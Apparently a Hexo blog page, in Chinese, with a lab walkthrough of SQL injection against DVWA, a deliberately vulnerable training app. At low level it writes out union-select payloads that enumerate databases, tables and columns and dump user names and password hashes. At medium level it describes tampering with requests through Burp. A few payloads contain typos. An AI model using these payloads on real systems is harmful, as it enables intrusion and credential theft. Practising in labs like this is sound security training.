@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    dvwa.  sql注入 |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/technology.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-dvwa.  sql" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      dvwa.  sql注入
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/04/23/dvwa.  sql/" class="article-date">
+  <time datetime="2019-04-23T07:05:18.000Z" itemprop="datePublished">2019-04-23</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/流量分析/">流量分析</a>
+  </div>
+
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <hr>
+<h1 id="dvwa-sql注入"><a href="#dvwa-sql注入" class="headerlink" title="dvwa.  sql注入"></a>dvwa.  sql注入</h1><p>1.low级别<br>1.查询当前数据库<br>1’ union select 1, database()#<br><a href="https://imgchr.com/i/mAdeJg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdeJg.png" alt="mAdeJg.png"></a><br>&emsp;<br>&emsp;<br>2.查询该数据库有几个字段，查找注入点，输入1’ 报错<br><a href="https://imgchr.com/i/mAd1e0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAd1e0.png" alt="mAd1e0.png"></a><br>&emsp;<br>后面加个#就能识别，此时注入点已经找到<br><a href="https://imgchr.com/i/mAdYYF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdYYF.png" alt="mAdYYF.png"></a><br>下面查询数据库有几列，三列不存在<br><a href="https://imgchr.com/i/mAdwO1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdwO1.png" alt="mAdwO1.png"></a><br>两列是有的，所有确定是两列<br><a href="https://imgchr.com/i/mAd6YD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAd6YD.png" alt="mAd6YD.png"></a><br>&emsp;<br>&emsp;<br>3.下面查询所有的数据库名字<br>1’ union select 1,schema_name（） from information_schema.columns#<br> union select联合查询      schema_name 数据库名字 。     information_schema.columns<br> <a href="https://imgchr.com/i/mAdITf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdITf.png" alt="mAdITf.png"></a><br> &emsp;<br> &emsp;<br> 4.数据库下的表查询，联合查询所有数据库中的表！<br>1’ union select 1,table_name form information_schema.tables#<br><a href="https://imgchr.com/i/mAdz7V" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdz7V.png" alt="mAdz7V.png"></a><br>&emsp;<br>&emsp;<br>5.查询表中的字段<br>1’ union select 1,column_name from information_schema.columns#<br><a href="https://imgchr.com/i/mAwVn1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwVn1.png" alt="mAwVn1.png"></a><br>&emsp;<br>&emsp;<br>6.查询dvwa数据库中的表 table_schema(数据库名<br>1’ union select 1, table_name from information_schema.tables where table_schema=’dvwa’#<br><a href="https://imgchr.com/i/mAw3jA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAw3jA.png" alt="mAw3jA.png"></a><br>&emsp;<br>&emsp;<br>7.查询数据库dvwa下user表下的字段table-name表名<br>1’ union select 1, column_name from information_schema.columns where table_name=’users’#<br><a href="https://imgchr.com/i/mAwBcj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwBcj.png" alt="mAwBcj.png"></a><br>&emsp;<br>&emsp;<br>8.查询dvwa库下的账户和密码<br>1’ union select user, password from users; #<br><a href="https://imgchr.com/i/mAwh34" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwh34.png" alt="mAwh34.png"></a><br>&amp;emsp<br>&amp;emsp<br>(2) .   1’ union select group_concat(user_id,user),group_concat(password) from users;#<br><a href="https://imgchr.com/i/mAwL4O" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwL4O.png" alt="mAwL4O.png"></a><br>2.medium级别<br><a href="https://imgchr.com/i/mA03PU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA03PU.png" alt="mA03PU.png"></a><br>可以看出没有回显，可以用burp抓包拦截，把数值调为一，burp开始拦截，发送到repeater里面<br>&emsp;<br>&emsp;<br><a href="https://imgchr.com/i/mA0DPO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0DPO.png" alt="mA0DPO.png"></a><br>改最下面一列的内容,右侧数据库已经显示出来了<br><a href="https://imgchr.com/i/mA0bss" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0bss.png" alt="mA0bss.png"></a><br>&emsp;<br>&emsp;<br>2.查看数据库的字段,改最后一列<br><a href="https://imgchr.com/i/mA0zJU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0zJU.png" alt="mA0zJU.png"></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/23/dvwa.  sql/" data-id="cjzc2nli2000anov64a7b7tvb"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dvwa-sql注入/">dvwa.  sql注入</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2019/05/20/ngx_lua——waf/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            搭建ngx_lua_waf
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/04/23/centos7-redis/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">在centos7中安装redis  HA（2个主2个从）</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/technology.js"></script>
+
+  </div>
+</body>
+</html>
